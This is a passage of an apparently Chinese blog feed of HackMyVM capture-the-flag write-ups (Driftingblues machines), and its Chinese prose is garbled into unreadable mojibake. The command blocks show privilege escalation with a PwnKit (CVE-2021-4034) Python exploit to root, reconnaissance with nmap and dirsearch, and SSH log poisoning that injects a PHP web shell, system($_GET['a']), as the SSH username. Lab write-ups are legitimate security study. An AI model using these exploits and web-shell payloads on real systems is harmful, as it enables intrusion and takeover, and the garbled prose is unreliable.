<p>è¿™ä¸ªç”¨æˆ·çš„ç›®å½•ä¸‹é¢é™¤äº†user.txtæ˜¯æœ‰ç”¨çš„å…¶ä»–éƒ½æ˜¯ç©ºæ–‡ä»¶å¤¹ã€‚ ä¹Ÿæ²¡æœ‰sudoå‘½ä»¤<br>ç”¨linpeas.shæ‰«æäº†ä¸€ä¸‹å‘ç°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root             31K Aug<span class="number"> 16 </span><span class="number"> 2019 </span>/usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root            146K Jan<span class="number"> 19 </span><span class="number"> 2021 </span>/snap/core18/2128/usr/bin/sudo</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸¤ä¸ªå¯ç–‘çš„ä¸œè¥¿ ä½†æ˜¯æˆ‘å°è¯•äº†ä¸Šé¢çš„é‚£ä¸ªæ¼æ´æ²¡æœ‰æˆåŠŸ</p>
<p>ä¸Šä¼ linux-exploit-suggester.shæ‰«æå¯ç–‘çš„æ¼æ´ å‘ç°æœ‰pwnkit</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="code"><pre><span class="line">[+] [CVE<span class="number">-2021</span><span class="number">-4034</span>] PwnKit</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/<span class="number">2022</span>/<span class="number">01</span>/<span class="number">25</span>/cve<span class="number">-2021</span><span class="number">-4034</span>/pwnkit.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=<span class="number">10</span>|<span class="type">11</span>|<span class="type">12</span>|<span class="type">13</span>|<span class="type">14</span>|<span class="type">15</span>|<span class="type">16</span>|<span class="type">17</span>|<span class="type">18</span>|<span class="type">19</span>|<span class="type">20</span>|<span class="type">21</span> ],debian=<span class="number">7</span>|<span class="type">8</span>|<span class="type">9</span>|<span class="type">10</span>|<span class="type">11</span>,fedora,manjaro</span><br><span class="line">   Download URL: https://codeload.github.com/berdav/CVE<span class="number">-2021</span><span class="number">-4034</span>/zip/main</span><br></pre></td></tr></table></figure></div>

<p>åœ¨githubæ‰¾åˆ°pyè„šæœ¬å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œé¶æœºä¸Šæœ‰python3</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">thugger@drippingblues:~$ vi pwn.py</span><br><span class="line">thugger@drippingblues:~$ python3 pwn.py</span><br><span class="line">[+] Creating shared library <span class="keyword">for</span> exploit code.</span><br><span class="line">[-] <span class="attribute">GCONV_PATH</span>=. directory already exists, continuing.</span><br><span class="line">[+] Calling execve()</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=1001(thugger) <span class="attribute">groups</span>=1001(thugger)</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå…¶ä»–ä¹Ÿæœ‰å¾ˆå¤šæ¼æ´å¯ä»¥ææƒ åˆšåˆšéšä¾¿è¯•äº†ä¸€ä¸ªCVE-2021-3156ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œgithubä¹Ÿæœ‰å¯¹åº”çš„pyæ–‡ä»¶</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul>
<li>å‰é¢å‡ºç°çš„ä¿¡æ¯éœ€è¦ç”„åˆ«ï¼Œè¿™é¢˜é‡Œé¢æœ‰æ²¡æœ‰çš„ä¿¡æ¯æ¯”å¦‚secret.zip è™šå‡çš„sshå¯†ç è·å–æ–¹å¼ ä½†æ˜¯robots.txtä¸­çš„å†…å®¹æˆ‘æ²¡æœ‰å¾ˆå¥½çš„å®Œå…¨åˆ©ç”¨ä¸Š</li>
<li>æ–°ä¸‹è½½äº†linux-exploit-suggester.shè¿™ä¸ªå·¥å…·ç”¨æ¥æŸ¥æ‰¾æ¼æ´</li>
<li>æ¼æ´æœ€å¥½ç”¨pyçš„ï¼Œå¯ä»¥åœ¨é¶æœºä¸Šç›´æ¥è¿è¡Œ</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Driftingblues3</title>
    <url>/posts/57863.html</url>
    <content><![CDATA[<p>HMV-Driftingblues3é¶åœºå¤ç›˜</p>
<span id="more"></span>
<p>è¿™ä¸ªé¶åœºæœ‰æ„æ€ï¼Œå­¦åˆ°äº†ä¸€ä¸ªsshæ³¨å…¥</p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.80.81     </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>3-<span class="number">19</span> <span class="number">23</span>:<span class="number">04</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">80.81</span>)</span><br><span class="line">Host is up (<span class="number">0.013</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">6</span>a:fe:d6:<span class="number">17</span>:<span class="number">23</span>:cb:<span class="number">90</span>:<span class="number">79</span>:<span class="number">2</span>b:b1:<span class="number">2</span>d:<span class="number">37</span>:<span class="number">53</span>:<span class="number">97</span>:<span class="number">46</span>:<span class="number">58</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">5</span>b:c4:<span class="number">68</span>:d1:<span class="number">89</span>:<span class="number">59</span>:d7:<span class="number">48</span>:b0:<span class="number">96</span>:f3:<span class="number">11</span>:<span class="number">87</span>:<span class="number">1</span>c:<span class="number">08</span>:ac (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">61</span>:<span class="number">39</span>:<span class="number">66</span>:<span class="number">88</span>:<span class="number">1</span>d:<span class="number">8</span>f:f1:d0:<span class="number">40</span>:<span class="number">61</span>:<span class="number">1</span>e:<span class="number">99</span>:c5:<span class="number">1</span>a:<span class="number">1</span>f:f4 (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="symbol">/eventadmins</span></span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">MAC <span class="params">Address:</span> C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">12.87</span> ms bogon (<span class="number">192.168</span>.<span class="number">80.81</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">9.02</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿˜æ˜¯åªå¼€æ”¾22ç«¯å£å’Œ80ç«¯å£</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p><img src="https://pic1.imgdb.cn/item/67dadd0f88c538a9b5c12297.png"><br>ä¸»é¡µæ˜¯è¿™æ ·çš„ï¼Œæ²¡æœ‰ä¸€ç‚¹æœ‰ç”¨çš„ä¿¡æ¯<br>è¿›è¡Œç›®å½•æ‰«æ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.80.81</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.80.81/_25-03-19_23-05-25.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">80.81</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">25</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span>                                     </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span>                                       </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">26</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">34</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">315</span>B  <span class="operator">-</span> <span class="symbol">/drupal</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">80.81</span><span class="operator">/</span>drupal<span class="symbol">/</span>         </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">36</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">11</span>B  <span class="operator">-</span> <span class="symbol">/Makefile</span>                                         </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">36</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">11</span>B  <span class="operator">-</span> <span class="symbol">/MANIFEST.MF</span>                                      </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">38</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/phpmyadmin</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">80.81</span><span class="operator">/</span>phpmyadmin<span class="symbol">/</span> </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">38</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">28</span>B  <span class="operator">-</span> <span class="operator">/</span>phpmyadmin<span class="symbol">/</span>                                      </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">39</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">316</span>B  <span class="operator">-</span> <span class="symbol">/privacy</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">80.81</span><span class="operator">/</span>privacy<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">39</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">37</span>B  <span class="operator">-</span> <span class="symbol">/robots.txt</span>                                       </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">39</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">25</span>B  <span class="operator">-</span> <span class="operator">/</span>secret<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">39</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">315</span>B  <span class="operator">-</span> <span class="symbol">/secret</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">80.81</span><span class="operator">/</span>secret<span class="symbol">/</span>         </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">278</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">43</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">458</span>B  <span class="operator">-</span> <span class="operator">/</span>wp-admin<span class="symbol">/</span>                                        </span><br><span class="line">[<span class="number">23</span>:<span class="number">05</span>:<span class="number">43</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">317</span>B  <span class="operator">-</span> <span class="symbol">/wp-admin</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">80.81</span><span class="operator">/</span>wp-admin<span class="symbol">/</span>     </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p>æ‰«å‡ºæ¥ä¸€äº›å¯ä»¥è®¿é—®çš„ç›®å½•ï¼Œæ¢æµ‹ä¹‹åï¼Œå‘ç°ä¹‹årobots.txté‡Œé¢æœ‰æœ‰ç”¨çš„ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.81/robots.txt      </span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /eventadmins                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.81/eventadmins</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The document has moved <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://192.168.80.81/eventadmins/&quot;</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.38 (Debian) Server at 192.168.80.81 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">man there&#x27;s a problem with ssh</span><br><span class="line"></span><br><span class="line">john said &quot;it&#x27;s poisonous!!! stay away!!!&quot;</span><br><span class="line"></span><br><span class="line">idk if he&#x27;s mentally challenged</span><br><span class="line"></span><br><span class="line">please find and fix it</span><br><span class="line"></span><br><span class="line">also check /littlequeenofspades.html</span><br><span class="line"></span><br><span class="line">your buddy, buddyG</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.81//littlequeenofspades.html</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Now, she is a little queen of spades, and the men will not let her be				<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Mmmm, she is the little queen of spades, and the men will not let her be             <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Everytime she makes a spread, hoo fair brown, cold chill just runs all over me       <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>I&#x27;m gon&#x27; get me a gamblin&#x27; woman, if the last thing that I do                        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Eee, gon&#x27; get me a gamblin&#x27; woman, if it&#x27;s the last thing that I do                  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Well, a man don&#x27;t need a woman, ooh fair brown, that he got to give all his money to <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Everybody say she got a mojo, now she&#x27;s been usin&#x27; that stuff                        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Mmmm, mmmm, &#x27;verybody says she got a mojo, &#x27;cause she been usin&#x27; that stuff          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>But she got a way trimmin&#x27; down, hoo fair brown, and I mean it&#x27;s most too tough      <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Now, little girl, since I am the king, baby, and you is a queen                      <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Ooo eee, since I am the king baby, and you is a queen                                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Le&#x27;s us put our heads together, hoo fair brown, then we can make our money green     <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:white&quot;</span>&gt;</span>aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ== | <span class="built_in">base64</span> -d</span><br><span class="line">intruder? L2FkbWluc2ZpeGl0LnBocA==                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> L2FkbWluc2ZpeGl0LnBocA==  | <span class="built_in">base64</span> -d                       </span><br><span class="line">/adminsfixit.php   </span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ª<code>adminsfixit.php</code>æ–‡ä»¶é‡Œæ˜¯sshçš„æ—¥å¿—æ–‡ä»¶<br>åœ¨è¿™ä¹‹å‰æˆ‘è¿˜å°è¯•äº†ç”¨å‡ºç°è¿‡çš„ç”¨æˆ·åhydraçˆ†ç ´ï¼Œä½†æ˜¯è¿™é‡Œçš„sshä¸æ”¯æŒç”¨å¯†ç ç™»å½•ã€‚<br>è¿™é‡Œå¡ä½äº†æˆ‘å¾ˆä¹…ï¼Œæˆ‘ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ï¼Œå…ˆæ˜¯ä»¥ä¸ºå¯èƒ½æœ‰åé—¨ï¼Œç”¨wfuzzæ‰«äº†ä¸€ä¸‹ï¼Œç„¶åæ¯æ¬¡éƒ½ä¼šå‡ºç°ä¸€äº›æ–°çš„å­—ç¬¦ï¼Œè¿™é‡Œè¿˜æœ‰æ˜¾ç¤ºrootæœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œä½†æ˜¯ä¹Ÿæ˜¯æ²¡ç”¨ã€‚<br>çœ‹äº†wpçŸ¥é“è¦ç”¨çš„æ˜¯sshæ³¨å…¥ å› ä¸ºè¿™æ˜¯phpæ–‡ä»¶ï¼Œå°±ç›´æ¥ç”¨phpæ³¨å…¥ã€‚ä½†æ˜¯è¦æ³¨æ„åªèƒ½å°è¯•ä¸€æ¬¡ã€‚ä¸ç„¶å†™é”™é¶æœºå°±ç‚¸äº†</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-xml">â””â”€# ssh &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]); <span class="meta">?&gt;</span></span><span class="language-xml">&#x27;@192.168.80.81</span></span><br><span class="line"><span class="language-xml">remote username contains invalid characters</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ç›´æ¥è¿™ä¹ˆå†™ä¸è¡Œï¼Œæ‰€ä»¥ç”¨msfä¸­çš„<code>auxiliary/scanner/ssh/ssh_login</code>è¿™ä¸ªæ¨¡å—ä¹Ÿæ˜¯æ–°å­¦åˆ°çš„ å› ä¸ºæˆ‘ä»¬è‡ªå·±çš„sshç”¨è¿™ä¸ªç”¨æˆ·åè¿ä¸ä¸Šï¼Œæ‰€ä»¥ç”¨æ¢ä¸ªç™»å½•æ–¹å¼</p>
